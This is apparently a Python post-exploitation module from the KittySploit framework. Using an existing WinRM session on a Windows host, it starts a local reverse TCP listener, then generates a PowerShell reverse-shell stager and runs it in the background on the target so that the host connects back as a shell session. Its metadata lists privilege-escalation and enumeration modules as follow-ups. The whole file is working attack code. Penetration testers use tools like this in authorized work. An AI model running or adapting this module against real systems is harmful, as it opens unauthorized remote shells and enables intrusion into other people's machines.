#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Spawn a reverse TCP shell from an existing WinRM session.
Starts a local reverse handler, runs a PowerShell stager on the target, and
registers the inbound connection as a new shell session.
"""

from kittysploit import *
from lib.exploit.handler import Reverse
from core.framework.failure import ProcedureError, FailureType

import importlib
import threading
import time


class Module(Post, Reverse):
	__info__ = {
		"name": "WinRM Spawn Reverse Shell",
		"description": (
			"From the current WinRM session, open a reverse TCP listener (lhost:lport) "
			"and run a PowerShell stager so the target connects back as a shell session."
		),
		"platform": Platform.WINDOWS,
		"author": "KittySploit Team",
		"session_type": SessionType.WINRM,
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["shell"],
				"suggested_followups": [
					"post/shell/windows/gather/enum_system",
					"post/shell/multi/gather/privesc_suggester",
				],
			},
		},
	}

	wait_seconds = OptInteger(
		5,
		"Seconds to wait after firing the stager for the callback",
		False,
	)

	def check(self):
		sid = self.session_id.value if hasattr(self.session_id, "value") else str(self.session_id)
		if not sid or not str(sid).strip():
			return False
		if self.framework and hasattr(self.framework, "session_manager"):
			if not self.framework.session_manager.get_session(str(sid).strip()):
				return False
		lhost_val = (self.lhost.value if hasattr(self.lhost, "value") else str(self.lhost) or "").strip()
		return bool(lhost_val)

	def _load_payload_module(self, import_path: str):
		mod = importlib.import_module(import_path)
		cls = getattr(mod, "Module", None)
		if not cls:
			raise ProcedureError(FailureType.Unknown, f"No Module class in {import_path}")
		return cls(framework=self.framework)

	def _generate_stager(self, lhost_val: str, lport_val: int) -> str:
		pl = self._load_payload_module(
			"modules.payloads.singles.cmd.windows.powershell_reverse_tcp"
		)
		pl.set_option("lhost", lhost_val)
		pl.set_option("lport", str(lport_val))
		out = pl.generate()
		if not out or not isinstance(out, str):
			raise ProcedureError(
				FailureType.Unknown, "PowerShell payload did not return a command string"
			)
		return out.strip()

	def _wrap_windows_background(self, inner: str) -> str:
		escaped = inner.replace('"', '\\"')
		return f'cmd /c start /b "" cmd /c "{escaped}"'

	def run(self):
		try:
			if not self.check():
				print_error("Session ID and lhost are required")
				return False

			lhost_val = str(self.lhost.value if hasattr(self.lhost, "value") else self.lhost).strip()
			lport_val = int(self.lport.value if hasattr(self.lport, "value") else self.lport)
			wait_s = int(
				self.wait_seconds.value
				if hasattr(self.wait_seconds, "value")
				else self.wait_seconds
			)

			print_status(f"WinRM reverse shell: callback {lhost_val}:{lport_val}")

			if not self.start_handler():
				print_error("Could not start reverse TCP listener")
				return False

			time.sleep(1.0)

			try:
				stager = self._generate_stager(lhost_val, lport_val)
			except ProcedureError as exc:
				print_error(str(exc))
				self.stop_handler()
				return False
			except Exception as exc:
				print_error(f"Payload generation failed: {exc}")
				self.stop_handler()
				return False

			remote_cmd = self._wrap_windows_background(stager)
			print_info("Sending PowerShell stager over WinRM (background)...")

			def _fire():
				try:
					self.cmd_execute(remote_cmd)
				except Exception as ex:
					print_warning(f"Stager thread reported: {ex}")

			threading.Thread(target=_fire, daemon=True).start()
			print_success("Stager dispatched")
			print_info(f"Waiting up to {wait_s}s for callback on {lhost_val}:{lport_val}...")
			time.sleep(max(1, wait_s))
			print_info(
				"If a new session appeared, use 'sessions' to interact with it. "
				"Listener stays open for more callbacks."
			)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"WinRM spawn reverse shell error: {exc}"
			)
